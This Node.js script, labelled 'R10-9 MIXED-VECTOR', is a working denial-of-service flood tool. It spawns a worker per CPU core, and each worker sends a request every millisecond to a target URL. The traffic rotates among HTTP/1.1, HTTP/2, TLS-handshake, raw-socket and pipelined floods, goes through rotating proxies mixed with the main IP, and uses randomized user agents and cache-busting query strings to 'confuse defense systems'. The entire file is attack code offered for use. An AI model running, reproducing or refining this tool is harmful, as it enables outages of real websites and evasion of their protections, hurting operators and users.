// R10-9: MIXED-VECTOR - Combined Attack Methods
// Focus: Confuse defense systems
// Technique: Rotate between all attack vectors
// Updated: Mixed main IP + proxies + authenticated proxy support

const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Parse proxy line - supports both formats: host:port and host:port:username:password
function parseProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: parts[2],
            password: parts[3],
            auth: true
        };
    } else if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            auth: false
        };
    }
    return null;
}

// Load proxies and user agents
try {
    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
    console.log(`[R10-9] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
} catch (e) {
    console.log('[R10-9] No proxy.txt found, running with main IP only');
}

// Mix settings
const USE_MAIN_IP = true;
const MIX_RATIO = 0.3; // 30% main IP

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-9] Loaded ${userAgents.length} user agents`);
} catch (e) {}

const methods = ['http1', 'http2', 'tls', 'raw', 'pipeline'];

function shouldUseMainIp() {
    return USE_MAIN_IP && Math.random() < MIX_RATIO;
}

if (cluster.isMaster) {
    console.log(`[R10-9] MIXED-VECTOR launching on ${CPU_CORES} cores`);
    console.log(`[R10-9] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    let requestCount = 0;
    let methodCounts = {};
    let mainIpCount = 0;
    let proxyCount = 0;
    
    const interval = setInterval(() => {
        const method = methods[Math.floor(Math.random() * methods.length)];
        const useMain = shouldUseMainIp();
        
        if (useMain) mainIpCount++;
        else proxyCount++;
        
        switch(method) {
            case 'http1':
                sendHTTP1(target, useMain);
                break;
            case 'http2':
                sendHTTP2(target, useMain);
                break;
            case 'tls':
                sendTLS(target, useMain);
                break;
            case 'raw':
                sendRaw(target, useMain);
                break;
            case 'pipeline':
                sendPipeline(target, useMain);
                break;
        }
        
        methodCounts[method] = (methodCounts[method] || 0) + 1;
        requestCount++;
    }, 1);
    
    function getProxyConnection(target, callback) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const socket = net.connect(proxy.port, proxy.host, () => {
            let connectReq = `CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n`;
            
            if (proxy.auth) {
                const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
            }
            
            connectReq += '\r\n';
            socket.write(connectReq);
            
            socket.once('data', () => {
                callback(socket);
            });
        });
        
        socket.on('error', () => {});
        return socket;
    }
    
    function sendHTTP1(target, useMain) {
        try {
            if (!useMain && proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                
                const options = {
                    hostname: proxy.host,
                    port: proxy.port,
                    method: 'CONNECT',
                    path: `${target.hostname}:443`
                };
                
                const req = http.request(options);
                req.on('connect', (res, socket) => {
                    if (proxy.auth) {
                        const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                        socket.write(`Proxy-Authorization: Basic ${auth}\r\n`);
                    }
                    
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    const tlsSocket = tls.connect({
                        socket: socket,
                        servername: target.hostname,
                        rejectUnauthorized: false
                    }, () => {
                        tlsSocket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                        setTimeout(() => tlsSocket.destroy(), 100);
                    });
                });
                req.end();
            } else {
                // Direct HTTP/1.1 (main IP)
                const ua = userAgents.length > 0 
                    ? userAgents[Math.floor(Math.random() * userAgents.length)]
                    : 'Mozilla/5.0';
                
                const options = {
                    hostname: target.hostname,
                    port: 443,
                    path: target.pathname + '?' + Math.random(),
                    method: 'GET',
                    headers: {
                        'Host': target.hostname,
                        'User-Agent': ua,
                        'Connection': 'close'
                    },
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, () => {});
                req.on('error', () => {});
                req.end();
            }
        } catch (e) {}
    }
    
    function sendHTTP2(target, useMain) {
        try {
            const ua = userAgents.length > 0 
                ? userAgents[Math.floor(Math.random() * userAgents.length)]
                : 'Mozilla/5.0';
            
            const session = http2.connect(target.origin, { rejectUnauthorized: false });
            const headers = {
                ':path': target.pathname + '?' + Math.random(),
                'user-agent': ua
            };
            const req = session.request(headers);
            req.on('response', () => req.close());
            req.end();
            setTimeout(() => session.destroy(), 100);
        } catch (e) {}
    }
    
    function sendTLS(target, useMain) {
        try {
            if (!useMain && proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                
                const socket = net.connect(proxy.port, proxy.host, () => {
                    let connectReq = `CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n`;
                    
                    if (proxy.auth) {
                        const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                        connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
                    }
                    
                    connectReq += '\r\n';
                    socket.write(connectReq);
                    
                    socket.once('data', () => {
                        const tlsSocket = tls.connect({
                            socket: socket,
                            servername: target.hostname,
                            rejectUnauthorized: false
                        }, () => {
                            tlsSocket.destroy();
                        });
                    });
                });
            } else {
                const socket = tls.connect(443, target.hostname, {
                    rejectUnauthorized: false,
                    servername: target.hostname
                }, () => socket.destroy());
            }
        } catch (e) {}
    }
    
    function sendRaw(target, useMain) {
        try {
            if (!useMain && proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                
                const socket = net.connect(proxy.port, proxy.host, () => {
                    let connectReq = `CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n`;
                    
                    if (proxy.auth) {
                        const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                        connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
                    }
                    
                    connectReq += '\r\n';
                    socket.write(connectReq);
                    
                    socket.once('data', () => {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        socket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                        setTimeout(() => socket.destroy(), 100);
                    });
                });
            } else {
                const socket = net.connect(443, target.hostname, () => {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    socket.write(`GET ${target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`);
                    setTimeout(() => socket.destroy(), 100);
                });
            }
        } catch (e) {}
    }
    
    function sendPipeline(target, useMain) {
        try {
            if (!useMain && proxies.length > 0) {
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                
                const socket = net.connect(proxy.port, proxy.host, () => {
                    let connectReq = `CONNECT ${target.hostname}:443 HTTP/1.1\r\nHost: ${target.hostname}:443\r\n`;
                    
                    if (proxy.auth) {
                        const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
                        connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
                    }
                    
                    connectReq += '\r\n';
                    socket.write(connectReq);
                    
                    socket.once('data', () => {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        let pipelined = '';
                        for (let i = 0; i < 10; i++) {
                            pipelined += `GET ${target.pathname}?${Math.random() + i} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`;
                        }
                        socket.write(pipelined);
                        setTimeout(() => socket.destroy(), 100);
                    });
                });
            } else {
                const socket = net.connect(443, target.hostname, () => {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    let pipelined = '';
                    for (let i = 0; i < 10; i++) {
                        pipelined += `GET ${target.pathname}?${Math.random() + i} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`;
                    }
                    socket.write(pipelined);
                    setTimeout(() => socket.destroy(), 100);
                });
            }
        } catch (e) {}
    }
    
    setInterval(() => {
        console.log(`[R10-9] Total RPS: ${requestCount} | Main: ${mainIpCount} | Proxy: ${proxyCount}`);
        console.log('Methods:', methodCounts);
        requestCount = 0;
        methodCounts = {};
        mainIpCount = 0;
        proxyCount = 0;
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
    }, time * 1000);
}